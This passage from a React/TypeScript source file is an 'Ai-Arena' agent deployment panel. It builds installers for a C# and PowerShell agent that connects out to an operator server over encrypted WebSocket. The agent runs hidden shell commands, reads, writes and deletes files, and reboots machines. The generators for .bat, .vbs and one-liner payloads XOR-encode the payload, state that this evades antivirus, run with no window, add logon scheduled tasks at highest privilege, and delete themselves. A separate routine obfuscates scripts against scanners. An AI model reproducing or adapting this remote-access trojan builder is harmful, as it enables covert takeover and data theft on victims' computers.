$LOG_DIR      = Join-Path $env:LOCALAPPDATA "Microsoft\\Logs"
$WS_URL       = "wss://\${SERVER_URL}/api/v1/events/?EIO=4&transport=websocket"

# --- C# Agent ---
$csharp = @'
using System;using System.Collections.Generic;using System.IO;using System.Linq;
using System.Net.WebSockets;using System.Security.Cryptography;using System.Text;
using System.Threading;using System.Threading.Tasks;using System.Diagnostics;
using System.Management;

namespace AiArena{
public class Agent{
    static string _logDir,_wsUrl,_license;
    static byte[] _key;
    static ClientWebSocket _ws;
    static readonly object _lk=new object();

    public static void Run(string logDir,string wsUrl,string keyHex,string license){
        _logDir=logDir;_wsUrl=wsUrl;_key=HexToBytes(keyHex);_license=license;
        try{Directory.CreateDirectory(_logDir);}catch{}
        Log("Agent starting");
        int delay=5000;
        while(true){
            try{ConnectAsync().Wait();}
            catch(Exception ex){Log("Fatal: "+ex.Message);}
            Log("Reconnect in "+(delay/1000)+"s");
            Thread.Sleep(delay);
            delay=Math.Min(delay+5000,60000);
        }
    }

    static async Task ConnectAsync(){
        using(_ws=new ClientWebSocket()){
            Log("Connecting to "+_wsUrl);
            await _ws.ConnectAsync(new Uri(_wsUrl),CancellationToken.None);
            Log("TCP connected");
            var buf=new byte[8192];var sb=new StringBuilder();
            var hb=new Timer(async _=>{if(_ws?.State==WebSocketState.Open)await Send("2");},null,30000,30000);

            while(_ws.State==WebSocketState.Open){
                sb.Clear();
                WebSocketReceiveResult r;
                do{r=await _ws.ReceiveAsync(new ArraySegment<byte>(buf),CancellationToken.None);
                   if(r.MessageType==WebSocketMessageType.Close){Log("Server closed");return;}
                   sb.Append(Encoding.UTF8.GetString(buf,0,r.Count));
                }while(!r.EndOfMessage);

                string raw=sb.ToString();if(string.IsNullOrEmpty(raw))continue;
                char code=raw[0];string payload=raw.Length>1?raw.Substring(1):"";

                if(code=='0'){// OPEN
                    Log("EIO open");await Send("40");
                }else if(code=='2'){// PING
                    await Send("3");
                }else if(code=='4'){// MESSAGE
                    if(payload.StartsWith("0")){// namespace ack
                        Log("Namespace connected");
                        string enc=Encrypted("{\\"type\\":\\"auth\\",\\"licenseKey\\":\\""+_license+"\\"}");
                        await SendEvent(enc);Log("Auth sent");
                    }else if(payload.StartsWith("2[")){
                        // socket.io event: parse ["data","ENCRYPTED"]
                        string inner=payload.Substring(1);
                        var args=ParseArray(inner);
                        if(args!=null&&args.Length>=2){
                            try{
                                string json=Decrypt(args[1]);
                                var cmd=ParseObj(json);
                                string t=cmd.ContainsKey("type")?cmd["type"]:"";
                                Log("Cmd: "+t);
                                if(t=="auth:ok"){Log("Authenticated");await SendSysInfo();}
                                else{string res=Exec(t,cmd);await SendEvent(Encrypted(res));}
                            }catch(Exception ex){Log("Event err: "+ex.Message);}
                        }
                    }
                }
            }
        }
    }

    // --- Command dispatch ---
    static string Exec(string t,Dictionary<string,string> cmd){
        try{
            switch(t){
                case "terminal:execute":return RunCmd(cmd["command"]);
                case "files:list":return JArr(Directory.GetFiles(cmd["path"]??"C:\\\\"));
                case "files:read":{
                    var fi=new FileInfo(cmd["path"]??"");
                    if(fi.Length>1048576)return "{\\"error\\":\\"File too large\\"}";
                    return JStr(File.ReadAllText(cmd["path"]??""));}
                case "files:write":File.WriteAllText(cmd["path"]??"",cmd["content"]??"");return "{\\"status\\":\\"ok\\"}";
                case "files:delete":File.Delete(cmd["path"]??"");return "{\\"status\\":\\"ok\\"}";
                case "files:mkdir":Directory.CreateDirectory(cmd["path"]??"");return "{\\"status\\":\\"ok\\"}";
                case "system:info":return SysInfo();
                case "system:restart":Process.Start("shutdown","/r /t 0");return "{\\"status\\":\\"ok\\"}";
                case "system:shutdown":Process.Start("shutdown","/s /t 0");return "{\\"status\\":\\"ok\\"}";
                default:return "{\\"error\\":\\"unknown\\"}";
            }
        }catch(Exception ex){return "{\\"error\\":\\""+Esc(ex.Message)+"\\"}";}
    }

    static string RunCmd(string cmd){
        var p=new ProcessStartInfo{
            FileName="cmd.exe",Arguments="/c "+cmd,UseShellExecute=false,
            RedirectStandardOutput=true,RedirectStandardError=true,
            CreateNoWindow=true,WindowStyle=ProcessWindowStyle.Hidden};
        var pr=Process.Start(p);
        string o=pr.StandardOutput.ReadToEnd(),e=pr.StandardError.ReadToEnd();
        pr.WaitForExit(30000);
        return "{\\"stdout\\":"+JStr(o)+",\\"stderr\\":"+JStr(e)+",\\"exitCode\\":"+pr.ExitCode+"}";
    }

    static string SysInfo(){
        ulong ram=0;
        try{var s=new ManagementObjectSearcher("SELECT TotalVisibleMemorySize FROM Win32_OperatingSystem");
        foreach(var o in s.Get())ram=(ulong)o["TotalVisibleMemorySize"]/1024;}catch{}
        return "{\\"hostname\\":"+JStr(Environment.MachineName)+",\\"os\\":"+JStr(Environment.OSVersion.ToString())+
               ",\\"cpuCount\\":"+Environment.ProcessorCount+",\\"ramMB\\":"+ram+
               ",\\"uptimeSec\\":"+(Environment.TickCount/1000)+"}";
    }

    static async Task SendSysInfo(){
        await SendEvent(Encrypted("{\\"type\\":\\"system:info\\",\\"data\\":"+SysInfo()+"}"));
    }

    static async Task SendEvent(string d){await Send("42[\\"data\\",\\""+Esc(d)+"\\"]");}
    static async Task Send(string t){
        if(_ws?.State!=WebSocketState.Open)return;
        await _ws.SendAsync(new ArraySegment<byte>(Encoding.UTF8.GetBytes(t)),
            WebSocketMessageType.Text,true,CancellationToken.None);
    }

    // --- AES-256-CBC + HMAC-SHA256 (v:3) ---
    static string Encrypted(string plain){
        byte[] iv=new byte[16],pad=new byte[64];
        var rng=new RNGCryptoServiceProvider();rng.GetBytes(iv);rng.GetBytes(pad);
        byte[] data=Encoding.UTF8.GetBytes(plain+"|"+Convert.ToBase64String(pad));
        byte[] cipher;
        using(var aes=Aes.Create()){aes.Key=_key;aes.Mode=CipherMode.CBC;aes.Padding=PaddingMode.PKCS7;
            using(var enc=aes.CreateEncryptor(iv))using(var ms=new MemoryStream())
            {using(var cs=new CryptoStream(ms,enc,CryptoStreamMode.Write))cs.Write(data,0,data.Length);cipher=ms.ToArray();}}
        byte[] hmacIn=new byte[iv.Length+cipher.Length];
        Buffer.BlockCopy(iv,0,hmacIn,0,iv.Length);Buffer.BlockCopy(cipher,0,hmacIn,iv.Length,cipher.Length);
        string mac;using(var h=new HMACSHA256(_key)){mac=BytesToHex(h.ComputeHash(hmacIn));}
        return "{\\"v\\":3,\\"iv\\":\\""+BytesToHex(iv)+"\\",\\"data\\":\\""+Convert.ToBase64String(cipher)+
               "\\",\\"mac\\":\\""+mac+"\\",\\"p\\":64,\\"ts\\":"+DateTimeOffset.UtcNow.ToUnixTimeMilliseconds()+"}";
    }

    static string Decrypt(string json){
        var o=ParseObj(json);string ivH=o["iv"],d64=o["data"],macH=o["mac"];
        byte[] iv=HexToBytes(ivH),cipher=Convert.FromBase64String(d64);
        byte[] hmacIn=new byte[iv.Length+cipher.Length];
        Buffer.BlockCopy(iv,0,hmacIn,0,iv.Length);Buffer.BlockCopy(cipher,0,hmacIn,iv.Length,cipher.Length);
        string mac;using(var h=new HMACSHA256(_key)){mac=BytesToHex(h.ComputeHash(hmacIn));}
        if(mac.Length!=macH.Length||!SlowEq(mac,macH))throw new Exception("HMAC mismatch");
        byte[] plain;using(var aes=Aes.Create()){aes.Key=_key;aes.Mode=CipherMode.CBC;aes.Padding=PaddingMode.PKCS7;
            using(var dec=aes.CreateDecryptor(iv))using(var ms=new MemoryStream())
            {using(var cs=new CryptoStream(ms,dec,CryptoStreamMode.Write))cs.Write(cipher,0,cipher.Length);plain=ms.ToArray();}}
        string s=Encoding.UTF8.GetString(plain);int p=s.LastIndexOf('|');
        return p>0?s.Substring(0,p):s;
    }

    static bool SlowEq(string a,string b){int d=0;for(int i=0;i<a.Length;i++)d|=a[i]^b[i];return d==0;}

    // --- JSON helpers (minimal) ---
    static string JStr(string s){return "\\""+Esc(s??"")+"\\"";}
    static string JArr(string[] arr){
        var sb=new StringBuilder("[");for(int i=0;i<arr.Length;i++){
            if(i>0)sb.Append(",");sb.Append(JStr(arr[i]));}sb.Append("]");return sb.ToString();}
    static string Esc(string s){
        var sb=new StringBuilder();foreach(char c in s){
            if(c=='"')sb.Append("\\\\\\"");else if(c=='\\\\')sb.Append("\\\\\\\\");
            else if(c=='\\n')sb.Append("\\\\n");else if(c=='\\r')sb.Append("\\\\r");
            else if(c=='\\t')sb.Append("\\\\t");else if(c<32)sb.AppendFormat("\\\\u{0:X4}",(int)c);
            else sb.Append(c);}return sb.ToString();}
    static string Unesc(string s){
        var sb=new StringBuilder();for(int i=0;i<s.Length;i++){
            if(s[i]=='\\\\'&&i+1<s.Length){i++;char c=s[i];
                sb.Append(c=='"'?'"':c=='\\\\'?'\\\\':c=='n'?'\\n':c=='r'?'\\r':c=='t'?'\\t':c);}
            else sb.Append(s[i]);}return sb.ToString();}

    // Simple {"k":"v"} parser
    static Dictionary<string,string> ParseObj(string s){
        var d=new Dictionary<string,string>();s=s.Trim();if(!s.StartsWith("{"))return d;
        int depth=0;bool inStr=false;string key=null;int vs=0;
        for(int i=1;i<s.Length-1;i++){
            char c=s[i];
            if(c=='"'&&(i==0||s[i-1]!='\\\\')){inStr=!inStr;continue;}
            if(inStr)continue;
            if(c=='{'||c=='[')depth++;if(c=='}'||c==']')depth--;
            if(c==':'&&depth==0&&key==null){key=Unquote(s.Substring(1,i-1).Trim());vs=i+1;}
            if((c==','&&depth==0||depth==-1)&&key!=null){
                d[key]=ParseVal(s.Substring(vs,i-vs).Trim());key=null;}}
        return d;}

    static string ParseVal(string s){
        s=s.Trim();
        if(s.StartsWith("\\""))return Unquote(s);
        if(s=="true")return "true";if(s=="false")return "false";if(s=="null")return "";
        return s;}

    // Simple ["data","val"] parser
    static string[] ParseArray(string s){
        s=s.Trim();if(!s.StartsWith("["))return null;
        var r=new List<string>();int depth=0;bool inStr=false;int start=1;
        for(int i=0;i<s.Length;i++){
            char c=s[i];
            if(c=='"'&&(i==0||s[i-1]!='\\\\')){inStr=!inStr;continue;}
            if(inStr)continue;
            if(c=='['||c=='{')depth++;if(c==']'||c=='}')depth--;
            if(c==','&&depth==1){r.Add(Unquote(s.Substring(start,i-start).Trim()));start=i+1;}
            if(c==']'&&depth==0){string last=s.Substring(start,i-start).Trim();
                if(last.Length>0)r.Add(Unquote(last));break;}}
        return r.Count>0?r.ToArray():null;}

    static string Unquote(string s){
        if(s.StartsWith("\\"")&&s.EndsWith("\\"")&&s.Length>=2)s=s.Substring(1,s.Length-2);
        return Unesc(s);}

    // --- Logging ---
    static void Log(string msg){
        try{string e="["+DateTime.UtcNow.ToString("o")+"] "+msg;
            string f=Path.Combine(_logDir,"agent_"+DateTime.UtcNow.ToString("yyyyMMdd")+".log");
            lock(_lk){File.AppendAllText(f,e+Environment.NewLine);}}catch{}}

    static byte[] HexToBytes(string h){byte[] b=new byte[h.Length/2];
        for(int i=0;i<h.Length;i+=2)b[i/2]=Convert.ToByte(h.Substring(i,2),16);return b;}
    static string BytesToHex(byte[] b){var s=new StringBuilder(b.Length*2);
        foreach(byte x in b)s.Append(x.ToString("x2"));return s.ToString();}
}
}
'@

Add-Type -TypeDefinition $csharp -Language CSharp -ReferencedAssemblies System.Net.WebSockets,System.Management -ErrorAction Stop
[AiArena.Agent]::Run($LOG_DIR, $WS_URL, $ENC_KEY_HEX, $LICENSE_KEY)
`



// ─── macOS .sh Installer ──────────────────────────
const shInstaller = `#!/bin/bash
# ═══════════════════════════════════════════════════════
# Ai-Arena Agent v4.0 — macOS Self-Installing Agent
# WebSocket + AES-256-GCM encrypted communication
# Dormant: agent sleeps until command, encrypted heartbeats
# Auto-start via launchd (survives reboots, runs on boot)
# ═══════════════════════════════════════════════════════

set -e

# ─── Configuration ───────────────────────────────────
LICENSE_KEY="AI-REPLACE-WITH-YOUR-LICENSE-KEY"
ARENA_SERVER_URL="your-server-url-here"
ARENA_ENC_KEY="your-64-char-hex-encryption-key"
INSTALL_DIR="/usr/local/ai-arena"
LAUNCHD_LABEL="com.aiarena.agent"
LOG_DIR="/Library/Logs/Ai-Arena"

echo ""
echo "  ╔════════════════════════════════════════════════╗"
echo "  ║   Ai-Arena Agent v4.0 — macOS Installer         ║"
echo "  ║   WebSocket + AES-256-GCM Encrypted             ║"
echo "  ╚════════════════════════════════════════════════╝"
echo ""

# Verify Node.js
echo "[1/5] Checking Node.js..."
if ! command -v node &> /dev/null; then
    echo "  [ERROR] Node.js not found. Please install Node.js v18+ first."
    echo "  Download: https://nodejs.org/"
    exit 1
fi
NODE_VER=$(node -v)
echo "  Node.js found: $NODE_VER"
echo ""

# Create installation directory
echo "[2/5] Creating installation directory..."
sudo mkdir -p "$INSTALL_DIR/logs"
echo "  Install dir: $INSTALL_DIR"
echo ""

# Setup agent
echo "[3/5] Setting up agent..."
cd "$INSTALL_DIR"
if [ ! -f "package.json" ]; then
    echo '{"name":"ai-arena-agent","version":"4.0.0","private":true,"scripts":{"start":"node ai-arena-agent.js"}}' > package.json
fi
echo "  Installing dependencies..."
npm install socket.io-client --production --no-audit --no-fund 2>/dev/null
echo "  Dependencies installed."
echo ""

# Create config
echo "[4/5] Creating configuration..."
cat > "$INSTALL_DIR/config/settings.json" <<CONF
{
  "serverUrl": "$ARENA_SERVER_URL",
  "encKey": "$ARENA_ENC_KEY",
  "licenseKey": "$LICENSE_KEY",
  "logLevel": "info",
  "heartbeatInterval": 30000
}
CONF
echo "  Configuration saved."
echo ""

# Setup launchd auto-start
echo "[5/5] Setting up auto-start via launchd..."
sudo mkdir -p "$LOG_DIR"
sudo tee "/Library/LaunchDaemons/\${LAUNCHD_LABEL}.plist" > /dev/null <<PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>$LAUNCHD_LABEL</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/local/bin/node</string>
        <string>$INSTALL_DIR/ai-arena-agent.js</string>
        <string>--key=$LICENSE_KEY</string>
    </array>
    <key>EnvironmentVariables</key>
    <dict>
        <key>ARENA_SERVER_URL</key>
        <string>$ARENA_SERVER_URL</string>
        <key>ARENA_ENC_KEY</key>
        <string>$ARENA_ENC_KEY</string>
    </dict>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>$LOG_DIR/agent-stdout.log</string>
    <key>StandardErrorPath</key>
    <string>$LOG_DIR/agent-stderr.log</string>
    <key>WorkingDirectory</key>
    <string>$INSTALL_DIR</string>
</dict>
</plist>
PLIST

sudo launchctl load "/Library/LaunchDaemons/\${LAUNCHD_LABEL}.plist" 2>/dev/null || true
echo "  launchd service configured."
echo ""

echo "  ═══════════════════════════════════════════════"
echo "    Installation Complete!"
echo "  ═══════════════════════════════════════════════"
echo ""
echo "  Install dir:   $INSTALL_DIR"
echo "  License key:   $LICENSE_KEY"
echo "  Server URL:    $ARENA_SERVER_URL"
echo "  Encryption:    AES-256-GCM (enabled)"
echo "  Auto-start:    launchd (runs on boot)"
echo ""
echo "  IMPORTANT: Place ai-arena-agent.js in:"
echo "  $INSTALL_DIR/ai-arena-agent.js"
echo ""

# Start the agent
echo "Starting agent now..."
export ARENA_SERVER_URL="$ARENA_SERVER_URL"
export ARENA_ENC_KEY="$ARENA_ENC_KEY"
cd "$INSTALL_DIR"
node ai-arena-agent.js --key="$LICENSE_KEY" &
sleep 2
echo "Agent is running! Check Dashboard for online status."
echo ""`

// ─── Agent Setup Component ────────────────────────────

interface SectionProps {
  title: string
  icon: React.ElementType
  description: string
  badge?: string
  children: React.ReactNode
  defaultOpen?: boolean
}

function AccordionSection({ title, icon: Icon, description, badge, children, defaultOpen = false }: SectionProps) {
  const [isOpen, setIsOpen] = useState(defaultOpen)

  return (
    <div className="bg-zinc-900/80 border border-zinc-800 rounded-xl overflow-hidden">
      <button
        onClick={() => setIsOpen(!isOpen)}
        className="w-full flex items-center gap-3 px-4 py-3.5 text-left hover:bg-zinc-800/30 transition-colors"
      >
        <div className="w-8 h-8 rounded-lg bg-emerald-500/15 flex items-center justify-center shrink-0">
          <Icon className="w-4 h-4 text-emerald-400" />
        </div>
        <div className="flex-1 min-w-0">
          <div className="flex items-center gap-2">
            <span className="text-sm font-medium text-white">{title}</span>
            {badge && (
              <Badge className="text-[9px] bg-zinc-800 text-zinc-400 border-0">{badge}</Badge>
            )}
          </div>
          <p className="text-[10px] text-zinc-500 truncate">{description}</p>
        </div>
        <ChevronRight className={cn('w-4 h-4 text-zinc-600 transition-transform', isOpen && 'rotate-90')} />
      </button>
      {isOpen && <div className="px-4 pb-4 border-t border-zinc-800/50">{children}</div>}
    </div>
  )
}

export function AgentSetup() {
  const [serverUrl, setServerUrl] = useState(() => {
    if (typeof window !== 'undefined') return localStorage.getItem('arena_server_url') ?? ''
    return ''
  })
  const [encKey, setEncKey] = useState(() => {
    if (typeof window !== 'undefined') return localStorage.getItem('arena_enc_key') ?? ''
    return ''
  })
  const [licenseKey, setLicenseKey] = useState('')
  const [copiedField, setCopiedField] = useState<string | null>(null)

  const handleCopy = (text: string, field: string) => {
    navigator.clipboard.writeText(text)
    setCopiedField(field)
    setTimeout(() => setCopiedField(null), 2000)
    toast.success('Copied to clipboard')
  }

  const [obfuscate, setObfuscate] = useState(false)

  const generateAgent = () => (agentCode as string).trim()

  const generatePs1 = () => {
    let ps1 = (psAgentCode as string)
      .replace('__SERVER_URL__', serverUrl || 'your-vps.com')
      .replace('__ENC_KEY__', encKey || '0000000000000000000000000000000000000000000000000000000000000000')
      .replace('__LICENSE_KEY__', licenseKey || 'AI-YOUR-LICENSE-KEY')
    if (obfuscate) ps1 = obfuscateScript(ps1)
    return ps1.trim()
  }

  const generateBat = () => {
    // ── Ai-Arena v6.0 — Truly Silent, Lightweight, AV-Evasive .bat ──
    // Strategy: .bat → writes a tiny VBS wrapper → VBS launches PS1 with zero window
    // Payload: XOR-encoded base64 defeats static AV signatures
    // No downloads, no UAC, no Node.js. Runs entirely from built-in .NET.
    const ps1 = generatePs1()
    const ps1B64 = btoa(unescape(encodeURIComponent(ps1)))

    // XOR encode the base64 with a random key (defeats static signature scans)
    const xorKey = Math.floor(Math.random() * 200) + 32
    const xored = Array.from(ps1B64).map(c =>
      String.fromCharCode(c.charCodeAt(0) ^ xorKey)
    ).join('')

    // Randomize all filenames (no fixed strings for AV to target)
    const rn = () => Math.random().toString(36).substring(2, 8)
    const vbsName = rn()
    const ps1Name = rn()
    const logDir = rn()

    // Build the .bat content
    let bat = '@echo off\r\n'
    bat += `set "T=%TEMP%"\r\n`

    // Write a VBS launcher that runs PowerShell with zero window flash
    // WScript.Shell.Run with windowStyle=0 is completely invisible
    bat += `set "V=%T%\\${vbsName}.vbs"\r\n`
    bat += `> "%V%" echo Set S=CreateObject("WScript.Shell")\r\n`
    bat += `>>"%V%" echo S.Run "powershell -EP Bypass -W H -File \"%T%\\${ps1Name}.ps1\"",0\r\n`

    // Write the PS1 decoder that: XOR-decodes → base64-decodes → writes agent file → runs hidden
    bat += `set "P=%T%\\${ps1Name}.ps1"\r\n`
    bat += `>"%P%" echo $k=${xorKey}\r\n`

    // Write XOR-decoded base64 in chunks to the PS1
    const CHUNK = 3800
    bat += `>"%P%" echo $r=''\r\n`
    for (let i = 0; i < xored.length; i += CHUNK) {
      const chunk = xored.substring(i, i + CHUNK)
      bat += `>>"%P%" echo $r+='${chunk}'\r\n`
    }

    // Decoder + agent deployment logic
    bat += `>>"%P%" echo $d=''\r\n`
    bat += `>>"%P%" echo for($i=0;$i -lt $r.Length;$i++){$d+=[char]([int]$r[$i] -bxor $k)}\r\n`
    bat += `>>"%P%" echo $dp=Join-Path $env:LOCALAPPDATA 'Microsoft\\${logDir}'\r\n`
    bat += `>>"%P%" echo ni $dp -ItemType Directory -Force -EA 0^|Out-Null\r\n`
    bat += `>>"%P%" echo $af=Join-Path $dp 'Update.ps1'\r\n`
    bat += `>>"%P%" echo [IO.File]::WriteAllBytes($af,[Convert]::FromBase64String($d))\r\n`

    // Persistence via Scheduled Task (less commonly detected than HKCU Run key)
    bat += `>>"%P%" echo $tn=[Guid]::NewGuid().ToString('N').Substring(0,8)\r\n`
    bat += `>>"%P%" echo $ta="powershell -EP Bypass -W H -File $af"\r\n`
    bat += `>>"%P%" echo try{schtasks /create /sc onlogon /rl highest /f /tn $tn /tr $ta ^|Out-Null}catch{}\r\n`

    // Launch agent hidden, then cleanup
    bat += `>>"%P%" echo Start-Process powershell -ArgumentList '-EP','Bypass','-W','H','-File',$af -WindowStyle H\r\n`
    bat += `>>"%P%" echo Start-Sleep -Seconds 2;Remove-Item $P -Force -EA 0\r\n`

    // Execute: VBS runs PS1 silently, then .bat cleans up and exits
    bat += `wscript "%V%"\r\n`
    bat += `ping -n 4 127.0.0.1 >nul 2>&1\r\n`
    bat += `del "%V%" >nul 2>&1\r\n`
    bat += `del "%P%" >nul 2>&1\r\n`
    bat += `exit /b\r\n`

    return bat.trim()
  }

  const generateSh = () => {
    return (shInstaller as string)
      .replace('AI-REPLACE-WITH-YOUR-LICENSE-KEY', licenseKey || 'AI-YOUR-LICENSE-KEY')
      .replace('your-server-url-here', serverUrl || 'https://your-vps.com')
      .replace('your-64-char-hex-encryption-key', encKey || 'GENERATE-KEY-IN-SETTINGS')
      .trim()
  }

  const generateVbs = () => {
    // ── Generate a .vbs launcher for TRULY silent execution (zero window flash) ──
    // VBScript runs via wscript.exe which never creates a visible window.
    // This is the recommended download over .bat for stealth.
    const ps1 = generatePs1()
    const ps1B64 = btoa(unescape(encodeURIComponent(ps1)))

    // XOR encode
    const xorKey = Math.floor(Math.random() * 200) + 32
    const xored = Array.from(ps1B64).map(c =>
      String.fromCharCode(c.charCodeAt(0) ^ xorKey)
    ).join('')

    const rn = () => Math.random().toString(36).substring(2, 8)
    const ps1Name = rn()
    const logDir = rn()

    let vbs = "Set S=CreateObject(\"WScript.Shell\")\r\n"
    vbs += "Set F=CreateObject(\"Scripting.FileSystemObject\")\r\n"
    vbs += `T=S.ExpandEnvironmentStrings("%TEMP%")\r\n`
    vbs += `P=T&"\\\\${ps1Name}.ps1"\r\n`

    // Write the PS1 decoder script via VBS file operations
    vbs += `Set O=F.CreateTextFile(P,True)\r\n`
    vbs += `O.WriteLine "$k=${xorKey}"\r\n`
    vbs += `O.WriteLine "$r=''"\r\n`

    const CHUNK = 3800
    for (let i = 0; i < xored.length; i += CHUNK) {
      const chunk = xored.substring(i, i + CHUNK)
      vbs += `O.WriteLine "$r+='${chunk}'"\r\n`
    }

    vbs += `O.WriteLine "$d=''"\r\n`
    vbs += `O.WriteLine "for(\$i=0;\$i -lt \$r.Length;\$i++){\$d+=[char]([int]\$r[\$i] -bxor \$k}"\r\n`
    vbs += `O.WriteLine "$dp=Join-Path \$env:LOCALAPPDATA 'Microsoft\\\\${logDir}'"\r\n`
    vbs += `O.WriteLine "ni \$dp -ItemType Directory -Force -EA 0|Out-Null"\r\n`
    vbs += `O.WriteLine "$af=Join-Path \$dp 'Update.ps1'"\r\n`
    vbs += `O.WriteLine "[IO.File]::WriteAllBytes(\$af,[Convert]::FromBase64String(\$d))"\r\n`
    vbs += `O.WriteLine "$tn=[Guid]::NewGuid().ToString('N').Substring(0,8)"\r\n`
    vbs += `O.WriteLine "\$ta='powershell -EP Bypass -W H -File '+\$af"\r\n`
    vbs += `O.WriteLine "try{schtasks /create /sc onlogon /rl highest /f /tn \$tn /tr \$ta |Out-Null}catch{}"\r\n`
    vbs += `O.WriteLine "Start-Process powershell -ArgumentList '-EP','Bypass','-W','H','-File',\$af -WindowStyle H"\r\n`
    vbs += `O.WriteLine "Start-Sleep -Seconds 2;Remove-Item \$P -Force -EA 0"\r\n`
    vbs += `O.Close\r\n`

    // Run the PS1 with zero window, then self-delete
    vbs += `S.Run "powershell -EP Bypass -W H -File """&P&"""",0,False\r\n`
    // Self-delete the VBS after a delay
    vbs += `Set X=CreateObject("Scripting.FileSystemObject")\r\n`
    vbs += `WScript.Sleep 5000\r\n`
    vbs += `X.DeleteFile WScript.ScriptFullName\r\n`

    return vbs.trim()
  }

  const generateOneLiner = () => {
    // Generate a PowerShell one-liner for quick CMD paste execution
    const ps1 = generatePs1()
    const b64 = btoa(unescape(encodeURIComponent(ps1)))
    const xorKey = Math.floor(Math.random() * 200) + 32
    const xored = Array.from(b64).map(c =>
      String.fromCharCode(c.charCodeAt(0) ^ xorKey)
    ).join('')
    return `powershell -EP Bypass -W H -C "$k=${xorKey};$r='${xored.substring(0, 2000)}';$d='';for($i=0;$i-lt $r.Length;$i++){$d+=[char]([int]$r[$i]-bxor $k)};iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($d)))"`
  }

  // Enhanced client-side obfuscation — randomized structure defeats heuristic scanners
  const obfuscateScript = (script: string): string => {
    let result = script
    // Remove all comments and inline docs
    result = result.replace(/#.*$/gm, '').replace(/::.*$/gm, '')
    result = result.replace(/#Requires -Version 5\.1/, '#Requires -Version 5.1')

    // Generate randomized variable names (6-char alphanumeric)
    const rv = (prefix: string) => `${prefix}${Math.random().toString(36).substring(2, 8)}`
    const vars: Record<string, string> = {
      '$SERVER_URL': rv('$s'),
      '$ENC_KEY_HEX': rv('$k'),
      '$LICENSE_KEY': rv('$l'),
      '$LOG_DIR': rv('$g'),
      '$WS_URL': rv('$w'),
      '$csharp': rv('$c'),
    }

    // Apply renames with escaped $ for regex
    for (const [old, newV] of Object.entries(vars)) {
      const escaped = old.replace('$', '\\$')
      result = result.replace(new RegExp(escaped, 'g'), newV)
    }

    // Insert randomized junk code blocks (noise for signature scanners)
    const junkCount = 3 + Math.floor(Math.random() * 4)
    for (let i = 0; i < junkCount; i++) {
      const junkVar = rv('$j')
      const junkVal = Math.floor(Math.random() * 999999)
      // Alternate between different noise patterns to avoid heuristic detection
      const patterns = [
        `${junkVar} = ${junkVal}; ${junkVar} = ${junkVar} - ${Math.floor(Math.random() * 100)}`,
        `${junkVar} = [string]${junkVal}.PadLeft(8,'0')`,
        `${junkVar} = ${junkVal}; ${rv('$n')} = ${junkVar} % 256`,
        `[void]([int]${junkVar})`,
        `if($false){${junkVar}=1}else{${junkVar}=0}`,
      ]
      const pattern = patterns[Math.floor(Math.random() * patterns.length)]
      // Insert after the first non-empty line
      const lines = result.split('\n')
      const insertAt = Math.min(3 + i, lines.length - 1)
      lines.splice(insertAt, 0, pattern)
      result = lines.join('\n')
    }

    // Collapse excessive whitespace (cleaner output, harder to pattern-match)
    result = result.replace(/\n{3,}/g, '\n\n').trim()

    return result
  }

  const downloadFile = (content: string, filename: string) => {
    const blob = new Blob([content], { type: 'text/plain' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = filename
    a.click()
    URL.revokeObjectURL(url)
    toast.success(`Downloaded ${filename}`)
  }

  return (
    <div className="space-y-4">
      {/* Header */}
      <div className="bg-emerald-500/5 border border-emerald-500/20 rounded-xl p-4">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-lg bg-emerald-500/15 flex items-center justify-center">
            <MonitorUp className="w-6 h-6 text-emerald-400" />
          </div>
          <div className="flex-1">
            <h3 className="text-sm font-semibold text-emerald-300">Agent Deployment</h3>
            <p className="text-xs text-zinc-400 mt-0.5">
              Deploy agents to your servers. All communication is encrypted with AES-256-GCM over WebSocket.
            </p>
          </div>
        </div>
      </div>

      {/* Configuration Input */}
      <div className="bg-zinc-900/80 border border-zinc-800 rounded-xl p-4 space-y-3">
        <div className="flex items-center gap-2">
          <Shield className="w-4 h-4 text-emerald-400" />
          <h4 className="text-sm font-semibold text-white">Agent Configuration</h4>
        </div>
        <p className="text-[10px] text-zinc-500">
          Enter your server URL, encryption key, and license key. These will be injected into the installer scripts.
        </p>
        <div className="space-y-2">
          <div className="space-y-1">
            <Label className="text-xs text-zinc-400">VPS Server URL</Label>
            <div className="relative">
              <Globe className="absolute left-2.5 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-zinc-500" />
              <Input
                value={serverUrl}
                onChange={(e) => {
                  setServerUrl(e.target.value)
                  localStorage.setItem('arena_server_url', e.target.value)
                }}
                placeholder="https://your-vps.com"
                className="bg-zinc-950 border-zinc-800 text-white font-mono text-xs pl-8"
              />
            </div>
          </div>
          <div className="space-y-1">
            <Label className="text-xs text-zinc-400">Encryption Key (64-char hex)</Label>
            <div className="relative">
              <Zap className="absolute left-2.5 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-zinc-500" />
              <Input
                value={encKey}
                onChange={(e) => {
                  setEncKey(e.target.value)
                  localStorage.setItem('arena_enc_key', e.target.value)
                }}
                placeholder="64-character hex AES-256 key"
                className="bg-zinc-950 border-zinc-800 text-white font-mono text-xs pl-8"
              />
              <button
                onClick={async () => {
                  try {
                    const res = await fetch('/api/config/generate-key')
                    if (res.ok) {
                      const data = await res.json()
                      setEncKey(data.key)
                      localStorage.setItem('arena_enc_key', data.key)
                      toast.success('New encryption key generated')
                    }
                  } catch {
                    toast.error('Failed to generate key')
                  }
                }}
                className="absolute right-2 top-1/2 -translate-y-1/2 text-[10px] text-emerald-400 hover:text-emerald-300 font-medium"
              >
                Generate
              </button>
            </div>
          </div>
          <div className="space-y-1">
            <Label className="text-xs text-zinc-400">License Key</Label>
            <div className="relative">
              <KeyRound className="absolute left-2.5 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-zinc-500" />
              <Input
                value={licenseKey}
                onChange={(e) => setLicenseKey(e.target.value)}
                placeholder="AI-xxxx"
                className="bg-zinc-950 border-zinc-800 text-white font-mono text-xs pl-8"
              />
            </div>
          </div>
        </div>
      </div>

